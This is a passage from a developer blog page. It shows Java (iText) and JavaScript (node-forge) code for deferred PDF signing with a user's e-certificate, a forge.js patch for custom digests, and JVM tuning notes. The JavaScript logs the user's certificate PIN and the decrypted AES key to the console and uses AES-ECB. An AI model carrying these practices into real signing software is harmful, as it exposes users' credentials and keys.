FileOutputStream(dest);</span><br><span class="line">    ExternalSignatureContainer external = new MyExternalSignatureContainer(signedHash);</span><br><span class="line">    MakeSignature.signDeferred(reader, Constants.SIG_FIELD_NAME, os, external);</span><br><span class="line">    os.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyExternalSignatureContainer implements ExternalSignatureContainer &#123;</span><br><span class="line">    protected byte[] sig;</span><br><span class="line"></span><br><span class="line">    public MyExternalSignatureContainer(byte[] sig) &#123;</span><br><span class="line">        this.sig = sig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void modifySigningDictionary(PdfDictionary signDic) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public byte[] sign(InputStream arg0) throws GeneralSecurityException &#123;</span><br><span class="line">        return sig;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JS-for-PDF-signing"><a href="#JS-for-PDF-signing" class="headerlink" title="JS for PDF signing"></a>JS for PDF signing</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">function signAndSubmit() &#123;</span><br><span class="line">  console.log(&quot;signAndSubmit&quot;)</span><br><span class="line"></span><br><span class="line">  var idType = $(&quot;:radio[name=&#x27;idType&#x27;]:checked&quot;).val();</span><br><span class="line">  var hkid = $(&quot;#hkid&quot;).val();</span><br><span class="line">  var hkidCheckDigit = $(&quot;#hkidCheckDigit&quot;).val();</span><br><span class="line">  var passport = $(&quot;#passport&quot;).val()</span><br><span class="line">  var file = document.getElementById(&quot;filename&quot;).files[0];</span><br><span class="line"></span><br><span class="line">  if (!checkInput(idType, hkid, hkidCheckDigit, passport, file))</span><br><span class="line">    return false;</span><br><span class="line"></span><br><span class="line">  var password = $(&quot;#pin&quot;).val();</span><br><span class="line">  console.log(&quot;password &quot; + password)</span><br><span class="line"></span><br><span class="line">  //Reading certificate from a &#x27;file&#x27; form field</span><br><span class="line">  var reader = new FileReader();</span><br><span class="line">  reader.onload = function (e) &#123;</span><br><span class="line">    var contents = e.target.result;</span><br><span class="line"></span><br><span class="line">    var pkcs12 = loadFile(password, contents);</span><br><span class="line">    if(!pkcs12)&#123;</span><br><span class="line">      showError(ErrorCode.INVALID_PIN);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    extractInfo(pkcs12, idType, hkid, hkidCheckDigit, passport).then(function (info) &#123;</span><br><span class="line">      var data = &#123;</span><br><span class="line">        signature: info.signature,</span><br><span class="line">        // certLogin: &quot;1&quot;,</span><br><span class="line">        certificate: info.certificate,</span><br><span class="line">        hkid: hkid + &quot;:&quot; + hkidCheckDigit,</span><br><span class="line">        passport: passport,</span><br><span class="line">        idType: idType,</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &#x27;GET&#x27;,</span><br><span class="line">        url: resetStatusUrl + &quot;?keep-challenge=1&quot;,</span><br><span class="line">        dataType: &#x27;json&#x27;,</span><br><span class="line">        async: false,</span><br><span class="line">        success: function(result) &#123;</span><br><span class="line">            if (result == 0) &#123;</span><br><span class="line">                console.log(&quot;start to do signing for the PDF&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(exception) &#123;</span><br><span class="line">          window.location.href = errPath;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $.get(validateUserUrl, &#123; hkid: data.hkid, passport: data.passport, idType: data.idType &#125;).done(function (result) &#123;</span><br><span class="line">        if (result == &#x27;T&#x27;) &#123;</span><br><span class="line">          $.get(signAndSubmitUrl, &#123; certificate: data.certificate &#125;).done(function (signature) &#123;</span><br><span class="line">            console.log(&quot;signature = &quot; + signature.length);</span><br><span class="line">            var ciphertext = forge.util.decode64(signature);</span><br><span class="line"></span><br><span class="line">            var buffer = forge.util.createBuffer(ciphertext, &#x27;binary&#x27;);</span><br><span class="line"></span><br><span class="line">            var aesKeyLength = buffer.getInt32();</span><br><span class="line">            console.log(&quot;aesKeyLength = &quot; + aesKeyLength);</span><br><span class="line"></span><br><span class="line">            var encryptedAesKey = buffer.getBytes(aesKeyLength);</span><br><span class="line">            console.dir(encryptedAesKey);</span><br><span class="line"></span><br><span class="line">            var aesKey = privateKey.decrypt(encryptedAesKey);</span><br><span class="line">            console.log(&quot;decrypted aesKey = &quot; + forge.util.encode64(aesKey));</span><br><span class="line"></span><br><span class="line">            var decipher = forge.cipher.createDecipher(&#x27;AES-ECB&#x27;, aesKey);</span><br><span class="line">            decipher.start();</span><br><span class="line">            decipher.update(forge.util.createBuffer(buffer.getBytes()));</span><br><span class="line"></span><br><span class="line">            var result = decipher.finish(); // check &#x27;result&#x27; for true/false</span><br><span class="line">            console.log(&quot;result = &quot; + result);</span><br><span class="line">            // outputs decrypted hex</span><br><span class="line">            // console.log(&quot;outputs decrypted hex = &quot; + decipher.output.toHex());</span><br><span class="line"></span><br><span class="line">            var emptySig = decipher.output.getBytes();</span><br><span class="line"></span><br><span class="line">            /* debug for signing</span><br><span class="line">            var md = forge.md.sha256.create();</span><br><span class="line">            var sh = md.update(decipher.output.getBytes()).digest().toHex();</span><br><span class="line">            console.log(&quot;origEmptySig sha256 hash = &quot; + sh);</span><br><span class="line">            var sh = privateKey.sign(md.update(decipher.output.getBytes()))</span><br><span class="line">            */</span><br><span class="line"></span><br><span class="line">            var p7 = forge.pkcs7.createSignedData();</span><br><span class="line">            p7.content = &quot;Arbitrary data&quot;; // privateKey.sign(md.update(decipher.output.getBytes()));</span><br><span class="line"></span><br><span class="line">            let _cert; // individual&#x27;s e-cert</span><br><span class="line">            if (info.ca.indexOf(&#x27;HKPOST&#x27;) != -1) &#123;</span><br><span class="line">              _cert = certChain[0];</span><br><span class="line">              certChain.reverse();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              _cert = certChain.slice(-1)[0]</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // e-cert order: root cert, intermediate cert, individual cert</span><br><span class="line">            for (var i = 0; i &lt;= certChain.length - 1; i++) &#123;</span><br><span class="line">              p7.addCertificate(certChain[i]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            p7.addSigner(&#123;</span><br><span class="line">              key: privateKey,</span><br><span class="line">              certificate: _cert,</span><br><span class="line">              digestAlgorithm: forge.pki.oids.sha256,</span><br><span class="line">              authenticatedAttributes: [&#123;</span><br><span class="line">                type: forge.pki.oids.contentType,</span><br><span class="line">                value: forge.pki.oids.data</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                type: forge.pki.oids.messageDigest,</span><br><span class="line">                value: emptySig // custom digest</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                type: forge.pki.oids.signingTime,</span><br><span class="line">                value: new Date()</span><br><span class="line">              &#125;]</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            p7.sign(&#123; detached: true &#125;);</span><br><span class="line"></span><br><span class="line">            //var out = forge.asn1.toDer(p7.toAsn1()).getBytes();</span><br><span class="line">            var out = forge.pkcs7.messageToPem(p7)</span><br><span class="line">            // console.log(out);</span><br><span class="line">            //var signedHash = forge.util.encode64(out);</span><br><span class="line">            signedHash = out.replace(&quot;-----BEGIN PKCS7-----&quot;, &quot;&quot;).replace(&quot;-----END PKCS7-----&quot;, &quot;&quot;).split(&quot;\r\n&quot;).join(&quot;&quot;);</span><br><span class="line">            //console.dir(signedHash);</span><br><span class="line"></span><br><span class="line">            data.signed = signedHash;</span><br><span class="line">            // console.dir(data);</span><br><span class="line"></span><br><span class="line">            $.post(signAndSubmitUrl, data, function (result) &#123;</span><br><span class="line">              //alert(&quot;sign result &quot; + result.status);</span><br><span class="line">              if (result.status == &quot;F&quot;) &#123;</span><br><span class="line">                showError(-131);</span><br><span class="line">              &#125; else &#123;</span><br><span class="line">                showMessage(&quot;doc.sign.success&quot;);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;).fail(function(xhr, statusText, error)&#123;</span><br><span class="line">              //alert(&quot;error status code &quot; + xhr.status);</span><br><span class="line">              if (xhr.status == 406) &#123;</span><br><span class="line">                  showError(-134);</span><br><span class="line">              &#125; else if (xhr.status == 404) &#123;</span><br><span class="line">                 showError(-133);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          showError(-138);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;).catch(function (info) &#123;</span><br><span class="line">      console.log(&quot;error code : &quot; + info.errCode);</span><br><span class="line">      showError(info.errCode);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  reader.readAsArrayBuffer(file);</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="following-code-writtern-was-studied-by-the-result-from-openssl-asn1parse-inform-pem-in-pkcs7-hash-pem"><a href="#following-code-writtern-was-studied-by-the-result-from-openssl-asn1parse-inform-pem-in-pkcs7-hash-pem" class="headerlink" title="following code writtern was studied by the result from openssl asn1parse -inform pem -in pkcs7-hash.pem"></a>following code writtern was studied by the result from <strong>openssl asn1parse -inform pem -in pkcs7-hash.pem</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i &lt;= certChain.length - 1; i++) &#123;</span><br><span class="line">  p7.addCertificate(certChain[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p7.addSigner(&#123;</span><br><span class="line">  key: privateKey,</span><br><span class="line">  certificate: _cert,</span><br><span class="line">  digestAlgorithm: forge.pki.oids.sha256,</span><br><span class="line">  authenticatedAttributes: [&#123;</span><br><span class="line">    type: forge.pki.oids.contentType,</span><br><span class="line">    value: forge.pki.oids.data</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    type: forge.pki.oids.messageDigest,</span><br><span class="line">    value: emptySig // custom digest</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    type: forge.pki.oids.signingTime,</span><br><span class="line">    value: new Date()</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p7.sign(&#123; detached: true &#125;);</span><br></pre></td></tr></table></figure>

<h2 id="forge-js-was-hacked-by-adding-following-code"><a href="#forge-js-was-hacked-by-adding-following-code" class="headerlink" title="forge.js was hacked by adding following code"></a>forge.js was hacked by adding following code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">for(var ai = 0; ai &lt; signer.authenticatedAttributes.length; ++ai) &#123;</span><br><span class="line">  var attr = signer.authenticatedAttributes[ai];</span><br><span class="line">  if(attr.type === forge.pki.oids.messageDigest) &#123;</span><br><span class="line">    // use content message digest as value</span><br><span class="line">    // attr.value = mds[signer.digestAlgorithm].digest();</span><br><span class="line"></span><br><span class="line">    // ++++++++ change for setting a custom digest for PDF signing</span><br><span class="line">    var digest = mds[signer.digestAlgorithm].start().update(attr.value).digest();</span><br><span class="line">    attr.value = digest;</span><br><span class="line">    // ++++++++ </span><br><span class="line"></span><br><span class="line">  &#125; else if(attr.type === forge.pki.oids.signingTime) &#123;</span><br><span class="line">    // auto-populate signing time if not already set</span><br><span class="line">    if(!attr.value) &#123;</span><br><span class="line">      attr.value = signingTime;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="AuthenticationApplet-java-itext-for-PDF-signing-below-code-is-as-the-reference-for-study-on-PDF-signing-with-js"><a href="#AuthenticationApplet-java-itext-for-PDF-signing-below-code-is-as-the-reference-for-study-on-PDF-signing-with-js" class="headerlink" title="AuthenticationApplet.java (itext for PDF signing), below code is as the reference for study on PDF signing with js"></a>AuthenticationApplet.java (itext for PDF signing), below code is as the reference for study on PDF signing with js</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">public String signDoc(String emptySig, String keyID, String type, String privateKeyPassword) &#123;</span><br><span class="line">    if (privateKeyPassword == null || &quot;&quot;.equals(privateKeyPassword.trim())) &#123;</span><br><span class="line">        privateKeyPassword = m_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (&quot;p12&quot;.equals(type)) &#123;</span><br><span class="line">        m_providerName = &quot;BC&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PrivateKey privateKey = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        privateKey = (PrivateKey) m_keyStore.getKey(keyID, privateKeyPassword.toCharArray());</span><br><span class="line">    &#125; catch (UnrecoverableKeyException | KeyStoreException | NoSuchAlgorithmException e1) &#123;</span><br><span class="line">        e1.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String signHashStr = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        //byte[] origEmptySig = Base64.getUrlDecoder().decode(emptySig);</span><br><span class="line">        byte[] origEmptySig = decrypt(Base64.getDecoder().decode(emptySig), privateKey);</span><br><span class="line">        // System.out.println(&quot;Showing information for debugging PDF signing using javascript</span><br><span class="line">        // System.out.println(&quot;origEmptySig = &quot; + Hex.toHexString(origEmptySig).substring(0, 300));</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream emptySignature = new ByteArrayInputStream(origEmptySig);</span><br><span class="line"></span><br><span class="line">        Security.addProvider(new BouncyCastleProvider());</span><br><span class="line"></span><br><span class="line">        PrivateKeySignature signature = new PrivateKeySignature(privateKey, &quot;SHA256&quot;, m_providerName);</span><br><span class="line">        String hashAlgorithm = signature.getHashAlgorithm();</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;hashAlgorithm = &quot; + hashAlgorithm);</span><br><span class="line">        BouncyCastleDigest digest = new BouncyCastleDigest();</span><br><span class="line">        Certificate[] certificateChain = retrieveCertificateChain(keyID);</span><br><span class="line"></span><br><span class="line">        /*String oid = DigestAlgorithms.getAllowedDigests(hashAlgorithm);</span><br><span class="line">        System.out.println(&quot;oid = &quot; + oid);*/</span><br><span class="line"></span><br><span class="line">        MessageDigest messageDigest = digest.getMessageDigest(hashAlgorithm);</span><br><span class="line">        byte hash[] = DigestAlgorithms.digest(emptySignature, messageDigest);</span><br><span class="line"></span><br><span class="line">        //MessageDigest messageDigest = MessageDigest.getInstance(&quot;SHA-256&quot;);</span><br><span class="line">        //byte hash[] = messageDigest.digest(origEmptySig);</span><br><span class="line"></span><br><span class="line">        // System.out.println(&quot;origEmptySig sha256 hash = &quot; + Hex.toHexString(hash));</span><br><span class="line"></span><br><span class="line">        PdfPKCS7 sgn = new PdfPKCS7(null, certificateChain, hashAlgorithm, null, digest, false);</span><br><span class="line">        Calendar cal = Calendar.getInstance();</span><br><span class="line">        byte[] sh = sgn.getAuthenticatedAttributeBytes(hash, cal, null, null, CryptoStandard.CMS);</span><br><span class="line">        //System.out.println(&quot;AuthenticatedAttributeBytes sha256 hash = &quot; + Hex.toHexString(sh));</span><br><span class="line"></span><br><span class="line">        byte[] extSignature = signature.sign(sh);</span><br><span class="line">        //System.out.println(&quot;signed AuthenticatedAttributeBytes = &quot; + Hex.toHexString(hash));</span><br><span class="line"></span><br><span class="line">        sgn.setExternalDigest(extSignature, null, signature.getEncryptionAlgorithm());</span><br><span class="line">        byte[] signHash = sgn.getEncodedPKCS7(hash, cal, null, null, null, CryptoStandard.CMS);</span><br><span class="line"></span><br><span class="line">        // System.out.println(&quot;signHash = &quot; + Hex.toHexString(signHash).substring(0, 300));</span><br><span class="line"></span><br><span class="line">        signHashStr = Base64.getEncoder().encodeToString(signHash);</span><br><span class="line">        //Files.write(Paths.get(&quot;D:/pkcs7-hash.p7b&quot;), signHash, StandardOpenOption.CREATE);</span><br><span class="line"></span><br><span class="line">        //System.out.println(&quot;signHash = &quot; + signHashStr);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        System.err.println(&quot;An unknown error on calculating hash for signature: &quot; + e.getMessage());</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return signHashStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static final String RSA_ALGORITHM = &quot;RSA/ECB/PKCS1Padding&quot;;</span><br><span class="line">private static final String AES_ALGORITHM = &quot;AES/ECB/PKCS5Padding&quot;;</span><br><span class="line"></span><br><span class="line">private byte[] decrypt(byte[] ciphertext, PrivateKey privateKey) throws IOException &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        Cipher rsaCipher = Cipher.getInstance(RSA_ALGORITHM);</span><br><span class="line">        rsaCipher.init(Cipher.DECRYPT_MODE, privateKey);</span><br><span class="line"></span><br><span class="line">        DataInputStream dis = new DataInputStream(new ByteArrayInputStream(ciphertext));</span><br><span class="line"></span><br><span class="line">        byte[] encryptedKeyBytes = new byte[dis.readInt()];</span><br><span class="line"></span><br><span class="line">        dis.readFully(encryptedKeyBytes);</span><br><span class="line"></span><br><span class="line">        byte[] aesKeyBytes = rsaCipher.doFinal(encryptedKeyBytes);</span><br><span class="line"></span><br><span class="line">        SecretKeySpec key = new SecretKeySpec(aesKeyBytes, &quot;AES&quot;);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(AES_ALGORITHM);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream output = new ByteArrayOutputStream();</span><br><span class="line">        int len = -1;</span><br><span class="line">        byte[] buffer = new byte[4096];</span><br><span class="line"></span><br><span class="line">        while ((len = dis.read(buffer, 0, buffer.length)) != -1) &#123;</span><br><span class="line">            output.write(buffer, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        output.flush();</span><br><span class="line"></span><br><span class="line">        return cipher.doFinal(output.toByteArray());</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        System.err.println(&quot;An unknown error on decrypt key: &quot; + e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/73156/whats-the-difference-between-x-509-and-pkcs7-certificate">https://security.stackexchange.com/questions/73156/whats-the-difference-between-x-509-and-pkcs7-certificate</a><br><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/41399/openssl-pkcs7-vs-s-mime">https://security.stackexchange.com/questions/41399/openssl-pkcs7-vs-s-mime</a><br><a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/37084/is-pkcs7-a-signature-format-or-a-certificate-format">https://crypto.stackexchange.com/questions/37084/is-pkcs7-a-signature-format-or-a-certificate-format</a></p>
<p>openssl asn1parse -inform pem -in pkcs7-hash.pem<br><a target="_blank" rel="noopener" href="http://qistoph.blogspot.com/2012/01/manual-verify-pkcs7-signed-data-with.html">Manual verify PKCS#7 signed data with OpenSSL</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-JVM_Study" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2019-01-23T05:13:53.000Z"><a href="/2019/01/23/JVM_Study/">2019-01-23</a></time>
      
      
  
    <h1 class="title"><a href="/2019/01/23/JVM_Study/">JVM Study</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="List-all-VM-flags"><a href="#List-all-VM-flags" class="headerlink" title="List all VM flags"></a>List all VM flags</h2><p><code>java -XX:+UnlockDiagnosticVMOptions -XX:+PrintFlagsFinal -version</code></p>
<h2 id="JAVA-OPTS-settings-for-OpenJDK-11"><a href="#JAVA-OPTS-settings-for-OpenJDK-11" class="headerlink" title="JAVA_OPTS settings for OpenJDK 11"></a>JAVA_OPTS settings for OpenJDK 11</h2><p>File: <code>d:\App\wildfly-10.1.0.Final\bin\standalone.conf.bat</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set &quot;JAVA_OPTS=%JAVA_OPTS% -Dhk.gov.ogcio.egis.rm.common.PROPERTIES_FILEPATH=D:\rm -Djboss.bind.address=0.0.0.0 -Dspring.profiles.active=uat -Djavax.net.ssl.trustStore=D:\keystore\tcspls_egis.jks -Dfreetts.voices=de.dfki.lt.freetts.en.us.MbrolaVoiceDirectory -Dmbrola.base=D:\mbrola&quot;</span><br><span class="line">set &quot;JAVA_OPTS=%JAVA_OPTS% -XX:MaxGCPauseMillis=500 -XX:ErrorFile=D:/log/hserrpid%p.log -XX:HeapDumpPath=D:/log/ -Xloggc:D:/log/gc.log -XX:+PrintGCDetails -XX:+HeapDumpOnOutOfMemoryError&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Profiling-commands"><a href="#Profiling-commands" class="headerlink" title="Profiling commands"></a>Profiling commands</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jinfo &lt;pid&gt;</span><br><span class="line"></span><br><span class="line">jmap -dump:live,format=b,file=heap.bin &lt;pid&gt;</span><br><span class="line">jstack &lt;pid&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="http://stas-blogspot.blogspot.com/2011/07/most-complete-list-of-xx-options-for.html">http://stas-blogspot.blogspot.com/2011/07/most-complete-list-of-xx-options-for.html</a><br><a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/java/javase/tech/vmoptions-jsp-140102.html#Options">https://www.oracle.com/technetwork/java/javase/tech/vmoptions-jsp-140102.html#Options</a><br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/43087831/complete-list-of-jvm-options">https://stackoverflow.com/questions/43087831/complete-list-of-jvm-options</a><br><a target="_blank" rel="noopener" href="https://my.oschina.net/u/3627055/blog/2995973">https://my.oschina.net/u/3627055/blog/2995973</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-ERC20_Token_Develop" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
